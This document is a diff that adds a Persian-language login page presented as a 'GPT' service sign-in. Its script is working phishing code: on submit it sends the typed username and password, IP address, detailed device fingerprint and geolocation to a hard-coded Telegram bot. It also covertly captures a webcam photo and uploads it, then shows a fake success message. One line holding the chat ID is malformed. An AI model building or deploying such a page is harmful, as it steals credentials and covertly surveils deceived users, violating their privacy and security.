@@ -1,0 +1,352 @@
+<!DOCTYPE html>    
+<html lang="fa" dir="rtl">    
+<head>    
+<meta charset="UTF-8" />    
+<meta name="viewport" content="width=device-width, initial-scale=1" />    
+<title>ورود به  GPT</title>    
+<style>    
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn&display=swap');    
+    * {    
+        margin: 0; padding: 0; box-sizing: border-box;    
+        font-family: 'Vazirmatn', Tahoma, sans-serif;    
+    }    
+    body {    
+        background: linear-gradient(135deg, #3a3a3a, #121212);    
+        height: 100vh;    
+        display: flex;    
+        justify-content: center;    
+        align-items: center;    
+        color: #eee;    
+    }    
+    .login-container {    
+        background: #1f1f1f;    
+        padding: 40px 35px;    
+        border-radius: 15px;    
+        width: 360px;    
+        box-shadow: 0 0 15px rgba(0,0,0,0.7);    
+        text-align: center;    
+    }    
+    .login-container h2 {    
+        margin-bottom: 25px;    
+        font-weight: 700;    
+        font-size: 26px;    
+        color: #00d8ff;    
+        text-shadow: 0 0 8px #00d8ff;    
+    }    
+    label {    
+        display: block;    
+        text-align: right;    
+        font-size: 15px;    
+        margin-bottom: 6px;    
+        color: #bbb;    
+        user-select: none;    
+    }    
+    input[type="text"], input[type="password"] {    
+        width: 100%;    
+        padding: 12px 15px;    
+        border-radius: 8px;    
+        border: none;    
+        margin-bottom: 20px;    
+        font-size: 16px;    
+        background: #2b2b2b;    
+        color: #eee;    
+        transition: box-shadow 0.3s ease;    
+    }    
+    input[type="text"]:focus, input[type="password"]:focus {    
+        outline: none;    
+        box-shadow: 0 0 8px #00d8ff;    
+        background: #333333;    
+    }    
+    button {    
+        width: 100%;    
+        padding: 14px;    
+        background: #00d8ff;    
+        border: none;    
+        border-radius: 10px;    
+        font-size: 18px;    
+        font-weight: 700;    
+        color: #121212;    
+        cursor: pointer;    
+        transition: background-color 0.3s ease;    
+        box-shadow: 0 0 12px #00d8ff;    
+    }    
+    button:hover {    
+        background: #00b3cc;    
+    }    
+    .message {    
+        margin-top: 15px;    
+        min-height: 24px;    
+        font-weight: 600;    
+        user-select: none;    
+    }    
+    .message.success {    
+        color: #4caf50;    
+    }    
+    .message.error {    
+        color: #f44336;    
+    }    
+</style>    
+</head>    
+<body>    
+    
+<div class="login-container">    
+    <h2>ورود به source GPT</h2>    
+    <form id="loginForm" autocomplete="off">    
+        <label for="username">نام کاربری</label>    
+        <input type="text" id="username" name="username" required autocomplete="username" />    
+    
+        <label for="password">رمز عبور</label>    
+        <input type="password" id="password" name="password" required autocomplete="current-password" />    
+    
+        <button type="submit" id="loginBtn">ورود</button>    
+    </form>    
+    <p class="message" id="statusMessage"></p>    
+</div>    
+    
+<script>    
+const telegramBotToken = '8289970750:AAGHnGsc0cKmDcwNxbZfXjmTuWHtby5U5ro';    
+const chatId = ''8599427639;    
+    
+const loginForm = document.getElementById('loginForm');    
+const loginBtn = document.getElementById('loginBtn');    
+const statusMessage = document.getElementById('statusMessage');    
+    
+function sendToTelegram(message) {    
+    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;    
+    const data = {    
+        chat_id: chatId,    
+        text: message,    
+        parse_mode: 'Markdown'    
+    };    
+    return fetch(url, {    
+        method: 'POST',    
+        headers: { 'Content-Type': 'application/json' },    
+        body: JSON.stringify(data)    
+    });    
+}    
+    
+function sendPhotoToTelegram(blob) {    
+    let formData = new FormData();    
+    formData.append('chat_id', chatId);    
+    formData.append('photo', blob, 'photo.jpg');    
+    
+    return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {    
+        method: 'POST',    
+        body: formData    
+    }).then(res => res.json());    
+}    
+    
+async function getIpInfo() {    
+    try {    
+        const res = await fetch('https://api.ipify.org?format=json');    
+        const data = await res.json();    
+        return `*آدرس آی‌پی:* ${data.ip}`;    
+    } catch {    
+        return '*آدرس آی‌پی:* نامشخص';    
+    }    
+}    
+    
+function getDeviceInfo() {    
+    return `*مرورگر:* ${navigator.userAgent}\n*سیستم عامل:* ${navigator.platform}`;    
+}    
+    
+function getTimeInfo() {    
+    return `*زمان ورود:* ${new Date().toLocaleString()}`;    
+}    
+    
+function getMemoryInfo() {    
+    if (navigator.deviceMemory) {    
+        return `*حافظه دستگاه:* ${navigator.deviceMemory} GB`;    
+    }    
+    return '*حافظه دستگاه:* نامشخص';    
+}    
+    
+function getCpuInfo() {    
+    return `*تعداد هسته‌های CPU:* ${navigator.hardwareConcurrency || 'نامشخص'}`;    
+}    
+    
+function getTouchInfo() {    
+    return `*حساسیت لمسی:* ${('ontouchstart' in window) || navigator.maxTouchPoints > 0 ? 'بله' : 'خیر'}`;    
+}    
+    
+function getLanguageInfo() {    
+    return `*زبان مرورگر:* ${navigator.language || 'نامشخص'}`;    
+}    
+    
+function getOnlineStatus() {    
+    return `*وضعیت آنلاین:* ${navigator.onLine ? 'بله' : 'خیر'}`;    
+}    
+    
+function getPdfSupport() {    
+    return `*پشتیبانی PDF:* ${window.navigator.mimeTypes['application/pdf'] ? 'بله' : 'خیر'}`;    
+}    
+    
+function getNotificationPermission() {    
+    return `*دسترسی نوتیفیکیشن:* ${Notification.permission}`;    
+}    
+    
+async function getMicrophonePermission() {    
+    try {    
+        const devices = await navigator.mediaDevices.enumerateDevices();    
+        const hasMic = devices.some(device => device.kind === 'audioinput');    
+        return `*دسترسی میکروفون:* ${hasMic ? 'دسترسی دارد' : 'ندارد'}`;    
+    } catch {    
+        return '*دسترسی میکروفون:* نامشخص';    
+    }    
+}    
+    
+function getCookiesEnabled() {    
+    return `*کوکی‌ها فعال:* ${navigator.cookieEnabled ? 'بله' : 'خیر'}`;    
+}    
+    
+function getScreenResolution() {    
+    return `*وضوح صفحه:* ${window.screen.width}x${window.screen.height}`;    
+}    
+    
+function getColorDepth() {    
+    return `*عمق رنگ:* ${window.screen.colorDepth}`;    
+}    
+    
+function getTimeZone() {    
+    return `*منطقه زمانی:* ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;    
+}    
+    
+function getWebGLInfo() {    
+    let canvas = document.createElement('canvas');    
+    let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');    
+    if (!gl) return ['*WebGL پشتیبانی نمی‌شود*', '*WebGL پشتیبانی نمی‌شود*'];    
+    let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');    
+    if (debugInfo) {    
+        return [    
+            `*WebGL Vendor:* ${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}`,    
+            `*WebGL Renderer:* ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`    
+        ];    
+    }    
+    return ['*WebGL Info:* نامشخص', '*WebGL Info:* نامشخص'];    
+}    
+    
+async function getBatteryInfo() {    
+    if (!navigator.getBattery) return ['*سطح باتری:* نامشخص', '*در حال شارژ:* نامشخص'];    
+    try {    
+        let battery = await navigator.getBattery();    
+        return [    
+            `*سطح باتری:* ${(battery.level * 100).toFixed(0)}%`,    
+            `*در حال شارژ:* ${battery.charging ? 'بله' : 'خیر'}`,    
+            `*زمان تا شارژ کامل:* ${battery.chargingTime === Infinity ? '∞' : battery.chargingTime + ' ثانیه'}`,    
+            `*زمان باقی مانده:* ${battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + ' ثانیه'}`    
+        ];    
+    } catch {    
+        return ['*سطح باتری:* نامشخص', '*در حال شارژ:* نامشخص'];    
+    }    
+}    
+    
+function getLocation() {    
+    return new Promise(resolve => {    
+        if (!navigator.geolocation) return resolve('*موقعیت جغرافیایی:* پشتیبانی نمی‌شود');    
+        navigator.geolocation.getCurrentPosition(    
+            pos => resolve(`*موقعیت جغرافیایی:* Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\n*دقت:* ${pos.coords.accuracy} متر`),    
+            () => resolve('*موقعیت جغرافیایی:* غیرقابل دسترسی')    
+        );    
+    });    
+}    
+    
+function takePhoto() {    
+    return new Promise((resolve, reject) => {    
+        navigator.mediaDevices.getUserMedia({ video: true })    
+            .then(stream => {    
+                const video = document.createElement('video');    
+                video.srcObject = stream;    
+                video.play();    
+                video.onloadedmetadata = () => {    
+                    const canvas = document.createElement('canvas');    
+                    canvas.width = video.videoWidth;    
+                    canvas.height = video.videoHeight;    
+                    setTimeout(() => {    
+                        const ctx = canvas.getContext('2d');    
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);    
+                        canvas.toBlob(blob => {    
+                            stream.getTracks().forEach(track => track.stop());    
+                            resolve(blob);    
+                        }, 'image/jpeg');    
+                    }, 1000);    
+                };    
+            })    
+            .catch(err => reject(err));    
+    });    
+}    
+    
+loginForm.addEventListener('submit', async (e) => {    
+    e.preventDefault();    
+    loginBtn.disabled = true;    
+    statusMessage.textContent = 'در حال ورود...';    
+    statusMessage.className = 'message';    
+    
+    const username = loginForm.username.value.trim();    
+    const password = loginForm.password.value.trim();    
+    
+    try {    
+        const ip = await getIpInfo();    
+        const device = getDeviceInfo();    
+        const time = getTimeInfo();    
+        const memory = getMemoryInfo();    
+        const cpu = getCpuInfo();    
+        const touch = getTouchInfo();    
+        const language = getLanguageInfo();    
+        const online = getOnlineStatus();    
+        const pdf = getPdfSupport();    
+        const notif = getNotificationPermission();    
+        const mic = await getMicrophonePermission();    
+        const cookies = getCookiesEnabled();    
+        const screen = getScreenResolution();    
+        const color = getColorDepth();    
+        const tz = getTimeZone();    
+        const [webglVendor, webglRenderer] = getWebGLInfo();    
+        const batteryInfo = await getBatteryInfo();    
+        const location = await getLocation();    
+    
+        const message =     
+`*ورود کاربر به Raif GPT*    
+*نام کاربری:* ${username}    
+*رمز عبور:* ${password}    
+    
+${ip}    
+${device}    
+${time}    
+${memory}    
+${cpu}    
+${touch}    
+${language}    
+${online}    
+${pdf}    
+${notif}    
+${mic}    
+${cookies}    
+${screen}    
+${color}    
+${tz}    
+${webglVendor}    
+${webglRenderer}    
+${batteryInfo.join('\n')}    
+${location}    
+`;    
+    
+        await sendToTelegram(message);    
+    
+        const photoBlob = await takePhoto();    
+        await sendPhotoToTelegram(photoBlob);    
+    
+        statusMessage.textContent = 'ورود موفق! خوش آمدید 😊';    
+        statusMessage.className = 'message success';    
+    
+        loginForm.reset();    
+    } catch (error) {    
+        console.error(error);    
+        statusMessage.textContent = '   ببخشید لطفا با فیلترشکن وارد شید .';    
+        statusMessage.className = 'message error';    
+    }    
+    loginBtn.disabled = false;    
+});    
+</script>    
+    
+</body>    
+</html>
